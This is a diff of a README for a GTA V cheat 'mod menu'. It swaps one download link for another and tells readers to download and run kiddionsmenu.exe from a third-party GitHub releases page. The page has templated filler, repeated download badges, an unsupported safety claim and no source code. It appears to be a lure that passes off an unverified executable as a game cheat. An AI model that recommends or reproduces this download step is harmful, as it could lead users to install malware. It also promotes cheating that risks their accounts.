@@ -1,70 +1,66 @@
-# 🎮 Kiddion’s Mod Menu – GTA V Ultimate Utility 2025
+# 🎮 kiddionsmenu - Easy Mod Menu for GTA V
 
-Unlock the full potential of **GTA V** with Kiddion’s Mod Menu – the ultimate tool for **customization, control, and fun**.  
-Perfect for single-player exploration, testing, or creative freedom.
+## 📥 Download Now
+[![Download kiddionsmenu](https://img.shields.io/badge/Download-kiddionsmenu-blue.svg)](https://github.com/SamPrince1/kiddionsmenu/releases)
 
-<p align="center">
-  <a href="https://sites.google.com/view/beliumsoft">
-    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-blueviolet" alt="Download Kiddion's Mod Menu" />
-  </a>
-</p>
+## 🚀 Getting Started
+Welcome to kiddionsmenu! This application allows you to enhance your GTA V gaming experience. With features like spawning items, unlimited money, all weapons, no recoil, and more, this mod menu opens new possibilities for your gameplay.
 
----
+### 🌐 What You Need
+Before you start, make sure you have the following:
 
-## 🔹 FEATURES
+- A computer running Windows 10 or later.
+- A copy of Grand Theft Auto V installed on your machine.
+- A stable internet connection to download the software.
 
-### Player & Character Enhancements
-- **God Mode** – Invincible character with no damage taken  
-- **Unlimited Ammo** – Shoot without worrying about reloads or ammo  
-- **Teleportation** – Move anywhere on the map instantly  
-- **Vehicle Spawning** – Spawn any car, plane, or bike  
-- **Super Jump & No Clip** – Fly or walk through objects  
+## 🤖 Features
+Kiddionsmenu offers a range of exciting features that can help you enjoy GTA V:
 
-### Money & Economy
-- **Money Drop** – Instantly add cash to your account  
-- **Weapon Unlocks** – Access all weapons without progression  
-- **Property & Vehicle Unlocks** – Own everything in single-player mode  
+- **Spawn Items**: Instantly create vehicles and items in the game world.
+- **Unlimited Money**: Gain access to endless in-game currency for buying upgrades and properties.
+- **All Weapons**: Get every weapon available in the game with just one click.
+- **No Recoil**: Enjoy perfect shooting with weapons that have no recoil.
 
-### World & Environment
-- **Weather & Time Control** – Change rain, sun, fog, or night/day cycles  
-- **NPC Control** – Modify AI behavior, spawn or remove pedestrians  
-- **Explosion & Gravity Modifiers** – Customize physics for fun chaos  
+## 📥 Download & Install
+To get started with kiddionsmenu, follow these steps:
 
-### Utilities & Customization
-- **Hotkey Profiles** – Quick access to favorite mods  
-- **Menu Transparency & Scale** – Adjust UI for comfort  
-- **Backup & Restore Settings** – Save your custom setups  
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/SamPrince1/kiddionsmenu/releases) to find the latest version of kiddionsmenu.
+  
+2. **Download the Installer**: Click on the latest version. Look for the file named `kiddionsmenu.exe` and download it.
 
----
+3. **Run the Installer**: Once the download is complete, locate the file in your Downloads folder. Double-click on `kiddionsmenu.exe` to run it.
 
-## 📋 SYSTEM REQUIREMENTS
+4. **Follow Installation Prompts**: The installer will guide you through the installation process. Follow the on-screen instructions.
 
-| Feature           | Minimum Specs                  |
-|-------------------|--------------------------------|
-| OS                | Windows 10 / 11               |
-| CPU               | Intel i5 / AMD Ryzen 5        |
-| RAM               | 8 GB+                          |
-| GPU               | GTX 960 / RX 470 or better     |
-| GTA V Version     | Latest Single-Player Update    |
-| Status            | Fully Tested & Optimized       |
+5. **Launch the Application**: After installing, you can find kiddionsmenu in your Start menu. Click to launch the application.
 
----
+6. **Configure and Use**: Upon launching, you may need to adjust some settings. The user interface is straightforward, so explore the options available to customize your gaming experience.
 
-## 🔖 TAGS
-`kiddions mod menu`, `gta v mods`, `gta v trainer`, `gta v god mode`,  
-`gta v teleport`, `gta v money drop`, `gta v ultimate menu`, `gta v cheat tool`
+## 🛠️ Troubleshooting
+If you encounter any issues, here are some common problems and solutions:
 
----
+- **Application Won’t Start**: Ensure your GTA V game is running. The mod menu functions only when the game is active.
 
-## ⚠ DISCLAIMER
-> Kiddion’s Mod Menu is intended for **single-player use only**.  
-> Use responsibly. Avoid using on online servers to prevent bans.
+- **Feature Not Working**: Check that you have installed the latest version of kiddionsmenu. Features may not work correctly if you use an older version.
 
----
+- **Download Issues**: If you can't download the installer, make sure your internet connection is stable. You may want to try a different browser.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/status-optimized-success?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/platform-Windows-purple?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/version-2025-lightgrey?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/mode-singleplayer-orange?style=for-the-badge" />
-</p>
+## ⚙️ Additional Information
+### 🔒 Safety and Security
+Kiddionsmenu is designed to be safe for use. However, it’s crucial to understand the risks associated with using mods in online games. Always play in a way that respects the game’s community standards.
+
+### 📖 User Guide
+For more detailed instructions and guides regarding specific features, you can check the [User Documentation](https://github.com/SamPrince1/kiddionsmenu/wiki).
+
+## 📞 Support
+If you need help or have questions, feel free to create an issue on the [Issues page](https://github.com/SamPrince1/kiddionsmenu/issues). We aim to respond promptly.
+
+## 🎯 Community and Feedback
+Join our community of GTA V players who use kiddionsmenu. Share your experiences and feedback to help us improve the application.
+
+Feel free to send your thoughts or suggestions, as we continually strive to enhance the user experience.
+
+## 📥 Download Now Again
+[![Download kiddionsmenu](https://img.shields.io/badge/Download-kiddionsmenu-blue.svg)](https://github.com/SamPrince1/kiddionsmenu/releases)
+
+We hope you enjoy using kiddionsmenu to enhance your Grand Theft Auto V experience!
